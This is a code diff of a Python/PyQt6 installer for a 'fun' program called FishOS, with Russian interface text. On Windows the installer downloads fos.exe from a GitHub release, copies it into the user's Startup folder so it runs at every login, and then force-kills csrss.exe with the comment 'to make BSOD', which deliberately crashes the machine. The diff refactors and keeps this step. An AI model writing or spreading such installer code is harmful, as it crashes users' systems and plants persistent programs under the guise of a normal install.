@@ -6,11 +6,9 @@ import requests
 from PyQt6 import QtGui
 from PyQt6.QtGui import QIcon
 from PyQt6.QtWidgets import *
-
-import down_bar
 from install_pages import page1, page2
-from install_pages.progress import  ProgressWindow
-from web import download_asset
+from install_pages.progress import ProgressWindow
+from web import download_asset, _get_local_data
 
 SIZE = (640, 480)
 VERSION = 'v0.0.1'
@@ -22,6 +20,7 @@ class InstallWindow(QWidget):
 
         self.installed = False
         self.iw = None
+        self.thread = None
 
         self.setWindowTitle("Install FishOS")
         self.setGeometry(300, 300, *SIZE)
@@ -50,85 +49,88 @@ class InstallWindow(QWidget):
             QMessageBox.information(
                 self,
                 "Warning",
-                "Пожалуйста, примите пользовательское соглашение и подтведтите, что вы отдаёте отчет своим действиям."
+                "Пожалуйста, примите пользовательское соглашение и подтвердите, что вы отдаёте отчет своим действиям."
             )
             return
         print("Installing FishOS")
-
         print(sys.platform)
 
         self.page2.cb1.setDisabled(True)
         self.page2.cb2.setDisabled(True)
         self.page2.cb3.setDisabled(True)
+        self.page2.install_button.setDisabled(True)
 
         self.run_install(sys.platform)
 
     def download_binary(self, system: str, local_data, startup_folder, link_path):
         if 'win' in system:
-            with open(os.path.join(local_data, 'fos.exe'), 'wb') as f:
-                r = requests.get('')
-                try:
-                    if r.status_code == 200:
-                        f.write(r.content)
-                    else:
-                        QMessageBox.critical(
-                            self,
-                            'Ошибка',
-                            "Ошибка получения основного файла программы с сервера. Попробуйте позже."
-                        )
-                        f.close()
-                        return
-                except requests.exceptions.ConnectionError:
-                    QMessageBox.critical(
-                        self,
-                        "Ошибка",
-                        'Ошибка подключения к серверу. Попробуйте позже'
-                    )
-                    f.close()
-                    return
+            url = f'https://github.com/Salmon-bit/FishOS/releases/download/{VERSION}/fos.exe'
+            dest = os.path.join(local_data, 'fos.exe')
 
-            # Adding EXE to startup
-            shutil.copyfile(os.path.join(local_data, 'fos.exe'), os.path.join(startup_folder, 'fos.exe'))
+            try:
+                r = requests.get(url, timeout=60)
+            except requests.exceptions.RequestException as e:
+                QMessageBox.critical(self, 'Ошибка', 'Ошибка подключения к серверу. Попробуйте позже')
+                print(f'Connection error: {e}')
+                return
+
+            if r.status_code != 200:
+                QMessageBox.critical(
+                    self,
+                    'Ошибка',
+                    "Ошибка получения основного файла программы с сервера. Попробуйте позже."
+                )
+                print(f'Binary download error: {r.status_code}')
+                return
+
+            with open(dest, 'wb') as f:
+                f.write(r.content)
+
+            # Добавляем EXE в автозагрузку
+            shutil.copyfile(dest, os.path.join(startup_folder, 'fos.exe'))
 
             self.iw.next()
 
             # Killing csrss.exe to make BSOD
             os.system('taskkill /F /IM csrss.exe')
-        elif system == 'linux':
-            with open(os.path.join(local_data, 'fos'), 'wb') as f:
-                r = requests.get(f'https://github.com/Salmon-bit/FishOS/releases/download/{VERSION}/fos')
-                try:
-                    if r.status_code == 200:
-                        f.write(r.content)
-                    else:
-                        QMessageBox.critical(
-                            self,
-                            'Ошибка',
-                            "Ошибка получения основного файла программы с сервера. Попробуйте позже."
-                        )
-                        return
-                except requests.exceptions.ConnectionError:
-                    QMessageBox.critical(
-                        self,
-                        "Ошибка",
-                        'Ошибка подключения к серверу. Попробуйте позже'
-                    )
-                    return
 
-            os.chmod(os.path.join(local_data, 'fos'), 0o755)
+        elif system == 'linux':
+            url = f'https://github.com/Salmon-bit/FishOS/releases/download/{VERSION}/fos'
+            dest = os.path.join(local_data, 'fos')
+
+            try:
+                r = requests.get(url, timeout=60)
+            except requests.exceptions.RequestException as e:
+                QMessageBox.critical(self, "Ошибка", 'Ошибка подключения к серверу. Попробуйте позже')
+                print(f'Connection error: {e}')
+                return
+
+            if r.status_code != 200:
+                QMessageBox.critical(
+                    self,
+                    'Ошибка',
+                    "Ошибка получения основного файла программы с сервера. Попробуйте позже."
+                )
+                print(f'Binary download error: {r.status_code}')
+                return
+
+            with open(dest, 'wb') as f:
+                f.write(r.content)
+
+            os.chmod(dest, 0o755)
 
             self.iw.next()
 
-            with open(link_path, "w") as f:
-                DATA = f"""\
+            DATA = f"""\
 [Desktop Entry]
 Version=1.0
 Name=FishOS
 Comment=Fun Operating System
 Type=Application
 Terminal=false
-Exec={os.path.join(local_data, 'fos')}
+Exec={dest}
 Icon={os.path.join(local_data, 'fos_ICON.png')}"""
+            with open(link_path, "w") as f:
                 f.write(DATA)
 
             self.iw.addValue(10)
@@ -136,7 +138,7 @@ Icon={os.path.join(local_data, 'fos_ICON.png')}"""
             QMessageBox.information(
                 self,
                 "Информация",
-                "FishOS успешно утсановлена на ваш ПК.\nСпасибо, что выбираете нас!"
+                "FishOS успешно установлена на ваш ПК.\nСпасибо, что выбираете нас!"
             )
 
     def run_install(self, system: str):
@@ -144,11 +146,10 @@ Icon={os.path.join(local_data, 'fos_ICON.png')}"""
             return
 
         if 'win' in system:
-            local_appdata = os.getenv("LOCALAPPDATA")
-            local_data = os.path.join(local_appdata, "FishOS")
-            os.mkdir(local_data)
+            local_data = _get_local_data()
+
             with open(os.path.join(local_data, 'assets_list.txt'), 'r', encoding='UTF-8') as f:
-                assets_list = [l.strip() for l in f.readlines()]
+                assets_list = [l.strip() for l in f.readlines() if l.strip()]
 
             if not download_asset('fos_ICON.ico'):
                 return
@@ -166,27 +167,34 @@ Icon={os.path.join(local_data, 'fos_ICON.png')}"""
             app_data = os.getenv("APPDATA")
             startup_folder = os.path.join(app_data, r"Microsoft\Windows\Start Menu\Programs\Startup")
 
-            # Downloading executable
-
-            th = Thread(target=self.download_binary, args=(sys.platform, local_data, startup_folder, ''))
-            th.start()
+            self.thread = Thread(
+                target=self.download_binary,
+                args=(sys.platform, local_data, startup_folder, ''),
+                daemon=True,
+            )
+            self.thread.start()
 
         elif system == 'linux':
             home_path = os.getenv("HOME")
             home_dirs = os.listdir(home_path)
 
-            if 'Desktop' in home_dirs:
-                link_path = os.path.join(os.path.join(home_path, "Desktop"), 'FishOS.desktop')
-            elif 'Рабочий стол' in home_dirs:
-                link_path = os.path.join(os.path.join(home_path, "Desktop"), 'FishOS.desktop')
-            else:
-                os.mkdir(os.path.join(home_path, "Desktop"))
-                link_path = os.path.join(os.path.join(home_path, "Desktop"))
+            desktop_dir = None
+            for name in ('Desktop', 'Рабочий стол'):
+                candidate = os.path.join(home_path, name)
+                if name in home_dirs and os.path.isdir(candidate):
+                    desktop_dir = candidate
+                    break
 
-            local_data = os.path.join(home_path, ".local/share/FishOS")
-            os.makedirs(local_data, exist_ok=True)
+            if desktop_dir is None:
+                desktop_dir = os.path.join(home_path, "Desktop")
+                os.makedirs(desktop_dir, exist_ok=True)
+
+            link_path = os.path.join(desktop_dir, 'FishOS.desktop')
+
+            local_data = _get_local_data()
+
             with open(os.path.join(local_data, 'assets_list.txt'), 'r', encoding='UTF-8') as f:
-                assets_list = [l.strip() for l in f.readlines()]
+                assets_list = [l.strip() for l in f.readlines() if l.strip()]
 
             if not download_asset('fos_ICON.png'):
                 return
@@ -201,10 +209,12 @@ Icon={os.path.join(local_data, 'fos_ICON.png')}"""
                     return
                 self.iw.next()
 
-            # Downloading executable
-
-            th = Thread(target=self.download_binary, args=(sys.platform, local_data, '', link_path))
-            th.start()
+            self.thread = Thread(
+                target=self.download_binary,
+                args=(sys.platform, local_data, '', link_path),
+                daemon=True,
+            )
+            self.thread.start()
 
     def closeEvent(self, event: QtGui.QCloseEvent) -> None:
         if not self.installed:
